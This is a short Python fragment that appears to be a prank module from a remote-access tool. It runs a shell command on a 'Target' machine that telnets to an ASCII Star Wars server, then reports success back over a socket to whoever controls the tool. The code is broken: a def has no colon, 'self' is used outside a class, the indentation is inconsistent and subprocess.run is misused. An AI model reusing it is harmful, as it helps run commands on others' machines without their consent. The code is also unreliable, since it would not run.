import os                                       # running commands                                # Socket Connection
import subprocess                               # Running commands
import sys                                      # System Information
import time                                     # Sleep

def playstarwars()
   msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
        self.runrun(msg)
        self.client.send("[+] Target is now Watching Star Wars Ep.IV: A New Hope".encode("utf-8"))
        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)

def runrun(msg):
    obj = "failed"
    try:
        obj, _ = subprocess.run(msg, check=True, shell=True)
        # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
    except Exception as e:
        print("This failed too (runrun) : " + str(e) + " + " + str(obj))

playstarwars()
